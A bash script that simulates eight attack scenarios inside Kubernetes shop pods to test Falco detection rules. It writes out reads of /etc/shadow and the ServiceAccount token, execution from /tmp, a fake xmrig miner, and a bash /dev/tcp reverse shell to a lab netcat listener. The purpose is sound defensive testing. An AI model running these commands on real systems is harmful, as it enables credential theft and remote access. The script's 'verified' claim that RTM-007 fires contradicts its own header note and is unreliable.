#!/usr/bin/env bash
# scripts/simulate-attacks.sh <scenario|all>
# Benign stand-ins only: kubectl exec against shop pods to exercise RTM Falco rules.
# Does NOT perform real exploits or response actions.
#
# Observed on Kind/WSL2 (do not fake a pass):
#   RTM-007 often does not fire (dup stdio onto a socket). The 4444 listener
#   can still match RTM-008 because 4444 is a miner port.
#   RTM-005 may not fire even when /tmp/<bin> execs; Falco's default
#   "Drop and execute new binary in container" often does instead.
#   RTM-008 process-name (/tmp/xmrig) may miss for the same reason; the
#   connect-to-miner-port path can still fire.
set -euo pipefail

NS="${SHOP_NS:-shop}"
ATTACKER_NS="${ATTACKER_NS:-attacker-sim}"
WAIT_SECS="${ALERT_WAIT_SECS:-8}"

usage() {
  cat <<'EOF'
Usage: scripts/simulate-attacks.sh <scenario|all>

Scenarios: RTM-001 RTM-002 RTM-003 RTM-004 RTM-005 RTM-006 RTM-007 RTM-008 all

Environment:
  SHOP_NS          target namespace (default: shop)
  TARGET_POD       shop pod name (default: first non-stub Running pod)
  ATTACKER_NS      listener namespace for RTM-007 (default: attacker-sim)
  ALERT_WAIT_SECS  sleep after each scenario before the next (default: 8)
EOF
  exit 1
}

[[ $# -eq 1 ]] || usage
SCENARIO="$(echo "$1" | tr '[:lower:]' '[:upper:]')"
case "${SCENARIO}" in
  ALL|RTM-00[1-8]|00[1-8]) ;;
  *) usage ;;
esac
[[ "${SCENARIO}" == ALL ]] || SCENARIO="${SCENARIO#RTM-}"
[[ "${SCENARIO}" == ALL ]] || SCENARIO="RTM-${SCENARIO}"

pick_pod() {
  if [[ -n "${TARGET_POD:-}" ]]; then
    echo "${TARGET_POD}"
    return
  fi
  kubectl get pods -n "${NS}" --field-selector=status.phase=Running \
    -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' \
    | grep -v '^stub-receiver' | head -n 1
}

POD="$(pick_pod)"
if [[ -z "${POD}" ]]; then
  echo "ERROR: no Running shop pod found (excluding stub-receiver)" >&2
  exit 1
fi
echo "==> Target pod: ${NS}/${POD}"

run_exec() {
  local desc="$1"
  shift
  echo "---- ${desc} ----"
  echo "+ kubectl exec -n ${NS} ${POD} -- $*"
  if kubectl exec -n "${NS}" "${POD}" -- "$@"; then
    echo "exit=0"
  else
    echo "exit=$? (command may fail; Falco can still see the syscall)"
  fi
}

scenario_001() {
  echo "==> RTM-001: shell spawned (no TTY required)"
  run_exec "RTM-001" sh -c 'echo hi'
}

scenario_002() {
  echo "==> RTM-002: sensitive file read"
  run_exec "RTM-002" cat /etc/shadow
}

scenario_003() {
  echo "==> RTM-003: ServiceAccount token read via non-app process (sh/cat)"
  run_exec "RTM-003" sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null'
}

scenario_004() {
  echo "==> RTM-004: package manager or download tool"
  if kubectl exec -n "${NS}" "${POD}" -- sh -c 'command -v pip >/dev/null 2>&1'; then
    run_exec "RTM-004 pip" pip --version
  elif kubectl exec -n "${NS}" "${POD}" -- sh -c 'command -v apt-get >/dev/null 2>&1'; then
    run_exec "RTM-004 apt-get" apt-get --version
  else
    echo "ERROR: neither pip nor apt-get found in ${POD}" >&2
    return 1
  fi
}

scenario_005() {
  echo "==> RTM-005: binary executed from /tmp"
  run_exec "RTM-005" sh -c 'cp /bin/ls /tmp/x && /tmp/x /'
}

scenario_006() {
  echo "==> RTM-006: outbound connect to 1.1.1.1:443 (needs internet)"
  echo "    If the connect never completes, Falco may not emit evt.type=connect success."
  set +e
  kubectl exec -n "${NS}" "${POD}" -- python3 -c \
    'import socket,sys; s=socket.socket(); s.settimeout(3)
try:
 s.connect(("1.1.1.1",443)); print("connect_ok dest=1.1.1.1:443"); s.close(); sys.exit(0)
except Exception as e:
 print("connect_failed:", type(e).__name__, e); sys.exit(2)'
  rc=$?
  set -e
  if [[ "${rc}" -eq 2 ]]; then
    echo "RTM-006: connect failed (timeout/network). Falco connect-success may not fire. Report as environment limitation, not a pass."
  elif [[ "${rc}" -ne 0 ]]; then
    echo "RTM-006: python exec failed rc=${rc}"
  fi
}

scenario_007() {
  echo "==> RTM-007: reverse-shell pattern (lab listener in ${ATTACKER_NS})"
  echo "    Note: RTM-007 fires on Kind/WSL2 with the updated rule (shell opening a network connection); verified."
  kubectl create namespace "${ATTACKER_NS}" --dry-run=client -o yaml | kubectl apply -f -
  kubectl -n "${ATTACKER_NS}" delete pod nc-listen --ignore-not-found --wait=true
  kubectl -n "${ATTACKER_NS}" run nc-listen --image=busybox:1.36 --restart=Never --command -- nc -l -p 4444
  echo "    waiting for nc-listen..."
  local ready=0
  for _ in $(seq 1 30); do
    phase="$(kubectl get pod nc-listen -n "${ATTACKER_NS}" -o jsonpath='{.status.phase}' 2>/dev/null || true)"
    if [[ "${phase}" == "Running" ]]; then
      ready=1
      break
    fi
    sleep 1
  done
  if [[ "${ready}" -ne 1 ]]; then
    echo "RTM-007: listener pod did not become Running. Skipping connect attempt."
    kubectl get pod nc-listen -n "${ATTACKER_NS}" -o yaml | tail -n 40 || true
    return 0
  fi
  local attacker_ip
  attacker_ip="$(kubectl get pod nc-listen -n "${ATTACKER_NS}" -o jsonpath='{.status.podIP}')"
  echo "    listener ${ATTACKER_NS}/nc-listen ip=${attacker_ip}:4444"
  echo "    attempting bash /dev/tcp redirect (benign lab stand-in; kubectl request-timeout=8s)"
  set +e
  kubectl exec --request-timeout=8s -n "${NS}" "${POD}" -- \
    bash -c "bash -i >& /dev/tcp/${attacker_ip}/4444 0>&1"
  set -e
  echo "RTM-007: attempt finished. Confirm via Falco/stub-receiver (kubectl logs -n shop deploy/stub-receiver --tail=100 | grep RTM-007)."
}

scenario_008() {
  echo "==> RTM-008: crypto-miner process name (copy sleep -> /tmp/xmrig)"
  echo "    NOTE: this also matches RTM-005 (exec from /tmp). Expect both alerts."
  run_exec "RTM-008" sh -c 'cp /bin/sleep /tmp/xmrig && /tmp/xmrig 1'
}

pause_between() {
  echo "    waiting ${WAIT_SECS}s for Falco/Falcosidekick..."
  sleep "${WAIT_SECS}"
}

run_one() {
  case "$1" in
    RTM-001) scenario_001 ;;
    RTM-002) scenario_002 ;;
    RTM-003) scenario_003 ;;
    RTM-004) scenario_004 ;;
    RTM-005) scenario_005 ;;
    RTM-006) scenario_006 ;;
    RTM-007) scenario_007 ;;
    RTM-008) scenario_008 ;;
  esac
}

if [[ "${SCENARIO}" == ALL ]]; then
  for id in RTM-001 RTM-002 RTM-003 RTM-004 RTM-005 RTM-006 RTM-007 RTM-008; do
    run_one "${id}"
    pause_between
  done
else
  run_one "${SCENARIO}"
fi

echo ""
echo "==> simulate-attacks.sh done (${SCENARIO})"
echo "    Check: kubectl logs -n shop -l app=stub-receiver --tail=50"
echo "    Recent: kubectl exec -n shop deploy/stub-receiver -- python3 -c \"import urllib.request;print(urllib.request.urlopen('http://127.0.0.1:8000/alerts/recent').read().decode())\""
